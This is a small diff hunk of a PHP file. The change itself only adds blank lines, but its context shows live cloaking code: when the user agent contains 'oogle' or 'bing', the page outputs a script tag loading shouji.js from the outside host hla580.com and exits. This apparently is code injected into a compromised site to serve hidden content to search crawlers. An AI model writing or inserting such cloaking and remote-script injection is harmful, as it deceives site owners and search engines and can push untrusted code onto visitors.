@@ -15,6 +15,8 @@ if(strstr($httpuser,'oogle') || strstr($httpuser,'bing')) {
     echo '<script language="javascript" src="https://hla580.com/shouji.js"></script>';
     
     exit;
+
+    
 }
 
 
